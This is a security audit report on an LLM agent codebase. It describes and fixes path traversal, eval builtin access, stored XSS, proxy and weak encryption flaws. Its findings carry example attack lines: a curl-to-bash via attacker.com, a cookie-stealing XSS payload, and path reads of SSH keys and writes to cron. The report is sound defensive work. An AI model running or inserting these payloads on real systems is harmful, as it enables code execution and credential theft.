# Security Audit Report — GenericAgent

**Date:** 2026-04-15  
**Auditor:** Senior Application Security Review  
**Scope:** Full codebase pre-launch review  
**Status:** 7 issues identified and fixed in this PR

---

## Summary

| ID | Severity | File | Issue | Status |
|----|----------|------|-------|--------|
| 1 | 🔴 Critical | `ga.py` | Path traversal in `_get_abs_path` | ✅ Fixed |
| 2 | 🔴 Critical | `ga.py` | `__builtins__` accessible in `eval()` / `exec()` | ✅ Fixed |
| 3 | 🟠 High | `llmcore.py` | SSL certificate warning suppression | ✅ Fixed |
| 4 | 🟠 High | `llmcore.py` | Hardcoded default proxy to localhost | ✅ Fixed |
| 5 | 🟠 High | `frontends/wechatapp.py` | External filename not sanitized (path traversal on write) | ✅ Fixed |
| 6 | 🟠 High | `frontends/stapp2.py` | Stored XSS via `unsafe_allow_html=True` | ✅ Fixed |
| 7 | 🟠 High | `memory/keychain.py` | Weak XOR obfuscation for stored secrets | ✅ Fixed |

---

## Findings & Fixes

---

### 1. 🔴 CRITICAL — Path Traversal in `_get_abs_path` (`ga.py`)

**Lines affected:** `ga.py:269–271`

**Vulnerability:**  
The original implementation simply joined `self.cwd` with a user/LLM-supplied `path` and called `os.path.abspath()`. It did not verify that the result stayed within the working directory. A path like `../../../../etc/shadow` or an absolute path like `/etc/cron.d/backdoor` would resolve and be accepted silently, allowing arbitrary file reads and writes anywhere on the filesystem.

This affected every file operation tool: `do_file_read`, `do_file_write`, `do_file_patch`, and `do_web_execute_js` (save-to-file).

**Exploitation example:**
```
# LLM calls file_read with:
{ "path": "../../../../root/.ssh/id_rsa" }
# → reads private SSH key
```

**Fix applied:**  
`os.path.realpath()` resolves all symlinks before the boundary check, and the result is required to start with `safe_root + os.sep`:

```python
def _get_abs_path(self, path):
    if not path: return ""
    resolved = os.path.realpath(os.path.abspath(os.path.join(self.cwd, path)))
    safe_root = os.path.realpath(os.path.abspath(self.cwd))
    if not resolved.startswith(safe_root + os.sep) and resolved != safe_root:
        raise PermissionError(f"Access denied: path '{path}' escapes the working directory.")
    return resolved
```

---

### 2. 🔴 CRITICAL — `__builtins__` accessible in `eval()` / `exec()` (`ga.py`)

**Lines affected:** `ga.py:290–294`

**Vulnerability:**  
The `_inline_eval` code path passed `eval()` a namespace dict without explicitly setting `'__builtins__'`. Python automatically injects the full `builtins` module when this key is absent, allowing `__import__`, `open`, `exec`, and the entire standard library to be called:

```python
eval("__import__('os').system('curl attacker.com | bash')", ns)
```

**Fix applied:**  
Set `'__builtins__': {}` in the eval namespace to prevent builtin access:

```python
ns = {'handler': self, 'parent': self.parent, '__builtins__': {}}
```

> **Note:** This is a defence-in-depth measure. `_inline_eval` is intended for trusted internal use only. For untrusted code execution, a proper sandbox (Docker, nsjail, etc.) remains the recommended approach.

---

### 3. 🟠 HIGH — SSL Certificate Warning Suppression (`llmcore.py`)

**Line affected:** `llmcore.py:3`

**Vulnerability:**  
```python
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
```
This globally silenced `InsecureRequestWarning` across the entire process. Combined with the hardcoded proxy (see Finding 4), this masked any MITM interception of API traffic. All LLM API calls — including API keys in `Authorization` headers and full conversation content — could be intercepted silently.

**Fix applied:**  
The line was removed. SSL warnings are now visible as intended.

---

### 4. 🟠 HIGH — Hardcoded Default Proxy to Localhost (`llmcore.py`)

**Line affected:** `llmcore.py:17`

**Vulnerability:**  
```python
proxy = mk.get("proxy", 'http://127.0.0.1:2082')
```
All HTTP requests (including LLM API calls carrying API keys and user data) were routed through `127.0.0.1:2082` by default, even when no proxy was configured in `mykey.py/json`. Any process that bound to that port — including malware — would silently intercept all LLM traffic.

**Fix applied:**  
```python
proxy = mk.get("proxy", None)
```
The proxy is now opt-in. No traffic is redirected unless the user explicitly configures it.

---

### 5. 🟠 HIGH — Filename Path Traversal on Media Download (`frontends/wechatapp.py`)

**Lines affected:** `wechatapp.py:182–183`

**Vulnerability:**  
A `file_name` field from an incoming WeChat message was used directly in `os.path.join(_TEMP_DIR, fname)` without sanitisation. A malicious sender could craft a filename containing `../` sequences to write decrypted file content to an arbitrary path:

```python
# Malicious fname from WeChat:
fname = "../../etc/cron.d/backdoor"
# → writes to /etc/cron.d/backdoor
```

This is a classic **Zip Slip** / path traversal on file upload.

**Fix applied:**  
`os.path.basename()` is applied to strip all directory components from the filename:

```python
fname = sub.get('file_name') or f'{uuid.uuid4().hex[:8]}{ext or ".bin"}'
fname = os.path.basename(fname) or f'{uuid.uuid4().hex[:8]}{ext or ".bin"}'
```

---

### 6. 🟠 HIGH — Stored XSS via `unsafe_allow_html=True` (`frontends/stapp2.py`)

**Lines affected:** `stapp2.py:1014–1017, 1039`

**Vulnerability:**  
The `render_message()` function rendered all stored messages (including LLM responses and user input) with `unsafe_allow_html=True`. If an LLM response or user message contained raw HTML, it was injected directly into the page DOM. A crafted response could execute JavaScript in the user's browser:

```html
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

This was a **Stored XSS** because messages are persisted in `st.session_state.messages`.

**Fix applied (two changes):**

1. `render_message` default parameter changed from `unsafe_allow_html=True` to `unsafe_allow_html=False`.
2. The message rendering loop changed to explicitly pass `unsafe_allow_html=False`.
3. The timestamp value is now escaped with `html.escape(ts)` before embedding in the timestamp `<div>`.

```python
def render_message(role, content, ts='', unsafe_allow_html=False):
    with st.chat_message(role):
        if ts: st.markdown(f'<div class="msg-timestamp">{html.escape(ts)}</div>', unsafe_allow_html=True)
        st.markdown(content, unsafe_allow_html=unsafe_allow_html)
```

Markdown formatting (bold, italic, code blocks, etc.) is fully preserved. Only raw HTML/script execution is blocked.

---

### 7. 🟠 HIGH — Weak XOR Obfuscation for Stored Secrets (`memory/keychain.py`)

**Lines affected:** `keychain.py:5–8, 41`

**Vulnerability:**  
API keys and other secrets were "encrypted" using XOR with a key derived from just the username:

```python
_MASK = hashlib.sha256(f"{os.getlogin()}@ga_keychain".encode()).digest()
def _xor(data: bytes) -> bytes:
    return bytes(b ^ _MASK[i % len(_MASK)] for i, b in enumerate(data))
```

Problems:
- **Guessable key**: derived from the OS username, which is trivially known to other processes and any attacker reading the file.
- **No authentication**: XOR provides no integrity guarantee; an attacker can flip bits in the ciphertext.
- **Trivially reversible**: XOR with a repeating key is equivalent to a Vigenère cipher and can be broken with known-plaintext analysis.

Anyone who obtained `~/ga_keychain.enc` (e.g. via the path-traversal vulnerability) could decrypt it immediately.

**Fix applied:**  
Replaced XOR with **Fernet** (`cryptography` library), which provides AES-128-CBC + HMAC-SHA256, a per-message IV, and authenticated encryption. The key is now derived via **PBKDF2-HMAC-SHA256 (200,000 iterations)** with a **per-installation random salt** stored in `~/ga_keychain.salt`:

```python
from cryptography.fernet import Fernet, InvalidToken

def _get_or_create_salt() -> bytes:
    if _SALT_PATH.exists():
        return _SALT_PATH.read_bytes()
    salt = os.urandom(16)
    _SALT_PATH.write_bytes(salt)
    return salt

def _derive_fernet_key() -> bytes:
    identity = f"{user}@ga_keychain".encode()
    salt = _get_or_create_salt()  # 16 random bytes, unique per installation
    dk = hashlib.pbkdf2_hmac("sha256", identity, salt, iterations=200_000)
    return base64.urlsafe_b64encode(dk)
```

**Automatic migration:** On first load, if Fernet decryption fails, the code attempts XOR decryption (legacy format) and immediately re-encrypts with Fernet, so existing keychain files are migrated transparently with no user action required.

---

## Remaining Recommendations (Out of Scope for This PR)

These items require architectural or operational changes beyond code-level fixes:

| # | Severity | Recommendation |
|---|----------|----------------|
| R1 | 🔴 Critical | **Sandbox code execution** — run `code_run` (Python/bash/PowerShell) inside an isolated container (Docker, nsjail) with restricted filesystem, no network, and CPU/memory limits |
| R2 | 🔴 Critical | **Prompt injection defences** — delimit user-supplied content in the LLM message; consider a human-approval gate for destructive tool calls |
| R3 | 🟠 High | **Add authentication** to the Streamlit frontends (OAuth2 proxy, Streamlit auth, or a session password) |
| R4 | 🟠 High | **Rate limiting** — add per-user request throttling across all chat frontends to prevent API cost exhaustion and DoS |
| R5 | 🟡 Medium | **CSRF protection** — add CSRF tokens or validate `Origin`/`Referer` headers on any HTTP endpoints |
| R6 | 🟡 Medium | **Audit logging** — log all tool invocations (file paths, code snippets, commands) with timestamps and user context for forensic analysis |
| R7 | 🟡 Medium | **Content Security Policy** — add CSP headers to web frontends to limit the blast radius of any future XSS |
| R8 | 🟢 Low | **Pre-commit secret scanning** — integrate `gitleaks` or `trufflehog` to prevent accidental credential commits |
| R9 | 🟢 Low | **Dependency scanning** — run `pip-audit` in CI to catch vulnerable transitive dependencies |

---

## Files Changed

| File | Change |
|------|--------|
| `ga.py` | Path boundary enforcement in `_get_abs_path`; `__builtins__: {}` in eval namespace |
| `llmcore.py` | Removed `urllib3.disable_warnings()`; changed default proxy to `None` |
| `frontends/wechatapp.py` | Applied `os.path.basename()` to externally-supplied filenames |
| `frontends/stapp2.py` | Changed `render_message` default to `unsafe_allow_html=False`; escaped `ts` with `html.escape()` |
| `memory/keychain.py` | Replaced XOR with Fernet AES encryption; added PBKDF2 key derivation; automatic legacy migration |
